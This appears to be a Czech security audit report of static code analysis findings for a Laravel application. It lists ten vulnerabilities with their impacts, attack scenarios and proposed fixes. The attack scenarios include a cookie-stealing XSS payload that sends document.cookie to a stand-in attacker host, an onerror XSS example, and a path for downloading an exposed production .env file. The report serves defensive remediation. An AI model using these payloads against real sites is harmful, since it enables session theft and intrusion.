# Statické nálezy a zranitelnosti (Static Code Analysis)

Tento dokument obsahuje detailní seznam zranitelností nalezených během statické analýzy zdrojového kódu projektu.

## Souhrnná tabulka priorit

| ID | Název | Závažnost | Stav |
|----|-------|-----------|------|
| 1 | Expozice .env.production.bak v public/ | **CRITICAL** | Nalezeno |
| 2 | Persistent XSS v CMS blocích (Custom HTML / Rich Text) | **HIGH** | Nalezeno |
| 3 | Broken Access Control v MediaDownloadController | **HIGH** | Nalezeno |
| 4 | XSS v Feedback Snapshotu | **HIGH** | Nalezeno |
| 5 | IDOR v ProfileController (Avatar selection) | **MEDIUM** | Nalezeno |
| 6 | XSS ve vyhledávání (HelpSearchService) | **MEDIUM** | Nalezeno |
| 7 | CSRF Bypass na Feedback endpointu | **MEDIUM** | Nalezeno |
| 8 | Chybějící Policies u citlivých modelů | **MEDIUM** | Nalezeno |
| 9 | SSRF v Screenshot Proxy | **MEDIUM** | Nalezeno |
| 10 | Neautorizovaná Impersonifikace v Screenshot Proxy | **HIGH** | Nalezeno |

---

## 1. Expozice .env.production.bak v public/ [CRITICAL]
- **Soubor:** `public/.env.production.bak`
- **Nález:** Ve složce `public` se nachází záložní soubor s kompletní konfigurací produkčního prostředí (DB hesla, API klíče, Laravel APP_KEY).
- **Dopad:** Kdokoliv na internetu si může stáhnout tento soubor a získat plný přístup k databázi a šifrovacím klíčům aplikace.
- **Attack Scenario:** Útočník pomocí skeneru (nebo jen odhadem) najde cestu `/public/.env.production.bak` (nebo jen `/.env.production.bak` pokud je root špatně nastaven) a stáhne si citlivá data.
- **Doporučení:** Soubor okamžitě smazat. Všechny v něm obsažené klíče a hesla považovat za kompromitované a změnit je.
- **Proposed Fix:** 
```bash
rm public/.env.production.bak
```

## 2. Persistent XSS v CMS blocích [HIGH]
- **Soubory:** 
    - `resources/views/components/public/blocks/custom_html.blade.php`
    - `resources/views/components/public/blocks/rich_text.blade.php`
- **Nález:** Obsah je renderován pomocí `{!! $data['html'] !!}` resp. `{!! $content !!}` bez jakékoli sanitizace.
- **Dopad:** Uživatel s přístupem k editaci stránek (např. trenér s omezeným oprávněním) může vložit škodlivý JavaScript, který se spustí všem návštěvníkům webu i administrátorům v jejich prohlížeči.
- **Attack Scenario:** Útočník vloží `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>` do bloku Custom HTML.
- **Doporučení:** Implementovat sanitizaci na straně výstupu nebo vstupu pomocí knihovny jako `mews/purifier`.
- **Proposed Fix:**
```php
// V komponentě nebo modelu před renderováním
{!! clean($content) !!}
```

## 3. Broken Access Control v MediaDownloadController [HIGH]
- **Soubor:** `app/Http/Controllers/MediaDownloadController.php` (řádek 19)
- **Nález:** Controller kontroluje oprávnění pouze pokud je vlastníkem média model `MediaAsset`. Ostatní modely (User, FinancePayment atd.) jsou ignorovány.
- **Dopad:** Pokud útočník zná UUID souboru (např. potvrzení o platbě jiného uživatele), může si ho stáhnout bez přihlášení.
- **Attack Scenario:** Útočník zjistí UUID citlivého souboru z logů nebo odhadem a zavolá `/media/download/{uuid}`.
- **Doporučení:** Implementovat generickou kontrolu oprávnění založenou na modelu, ke kterému je médium připojeno.
- **Proposed Fix:**
```php
public function download(string $uuid)
{
    $media = Media::where('uuid', $uuid)->firstOrFail();
    $this->authorize('view', $media->model); // Použít Laravel Policy modelu
    // ...
}
```

## 4. XSS v Feedback Snapshotu [HIGH]
- **Soubor:** `resources/views/feedback/snapshot.blade.php`
- **Nález:** `{!! $dom !!}` renderuje neošetřený HTML kód nahraný uživatelem.
- **Dopad:** Útočník pošle feedback se skriptem. Admin si snapshot prohlédne a skript ukradne jeho session token.
- **Doporučení:** Sanitizovat DOM před uložením nebo renderovat v sandboxu.
- **Proposed Fix:**
```php
// resources/views/feedback/snapshot.blade.php
<iframe srcdoc="{{ htmlspecialchars($dom) }}" sandbox></iframe>
```

## 5. IDOR v ProfileController (Avatar Selection) [MEDIUM]
- **Soubor:** `app/Http/Controllers/Member/ProfileController.php` (metoda `selectAvatarFromAsset`)
- **Nález:** Chybí kontrola, zda `MediaAsset` (z galerie), který si uživatel vybírá jako avatar, je veřejný nebo patří jemu.
- **Dopad:** Uživatel si může nastavit jako avatar jakýkoliv soubor ze systému (včetně soukromých dokumentů jiných uživatelů, pokud jsou v MediaLibrary).
- **Attack Scenario:** Útočník podvrhne `asset_id` v POST požadavku na `/member/profile/avatar/select`.
- **Doporučení:** Přidat kontrolu `is_public` nebo vlastnictví v metodě controlleru.

## 6. XSS ve vyhledávání (HelpSearchService) [MEDIUM]
- **Soubor:** `app/Services/Help/HelpSearchService.php` (metoda `highlight`)
- **Nález:** Funkce vrací HTML tagy `<mark>` vložené do původního textu, který neprošel sanitací před manipulací.
- **Dopad:** Pokud článek obsahuje např. `<img src=x onerror=alert(1)>` v polích title/purpose, vyhledávání toto vykreslí.
- **Doporučení:** Text nejdříve escapovat pomocí `e()` a až poté vložit zvýrazňující tagy.
- **Proposed Fix:**
```php
protected function highlight(string $text, string $query): string
{
    $escapedText = e($text);
    return preg_replace('/(' . preg_quote(e($query), '/') . ')/i', '<mark>$1</mark>', $escapedText);
}
```

## 7. CSRF Bypass na Feedbacku [MEDIUM]
- **Soubor:** `bootstrap/app.php`
- **Nález:** Výjimka pro `/feedback` v CSRF ochraně.
- **Dopad:** Možnost odesílat feedbacky jménem přihlášených uživatelů bez jejich vědomí.
- **Doporučení:** Odstranit výjimku a zajistit předávání CSRF tokenu ve feedback widgetu.

## 8. Chybějící Policies u citlivých modelů [MEDIUM]
- **Soubor:** `app/Policies/` (absence souborů pro Page, FeedbackReport, atd.)
- **Nález:** Filament Resources pro tyto modely nemají definované politiky, což může dovolit přístup uživatelům s rolí 'editor' nebo 'coach' k datům, která by neměli vidět.
- **Doporučení:** Vytvořit Policy pro každý model a zaregistrovat je.

## 9. SSRF v Screenshot Proxy [MEDIUM]
- **Soubor:** `app/Http/Controllers/ScreenshotRenderController.php`
- **Nález:** Slabá validace `isInternalUrl` umožňuje technicky zadat adresy typu `//127.0.0.1`.
- **Doporučení:** Striktně povolit pouze URL začínající na `config('app.url')`.

## 10. Neautorizovaná Impersonifikace v Screenshot Proxy [HIGH]
- **Soubor:** `app/Http/Controllers/ScreenshotRenderController.php`
- **Nález:** `Auth::loginUsingId` v controlleru přístupném přes signovanou URL.
- **Dopad:** Riziko zneužití při úniku APP_KEY nebo zachycení signované URL (např. v logách proxy).
- **Doporučení:** Odstranit impersonifikaci, renderovat screenshoty s anonymizovanými daty nebo předávat data přes parametry bez nutnosti login.
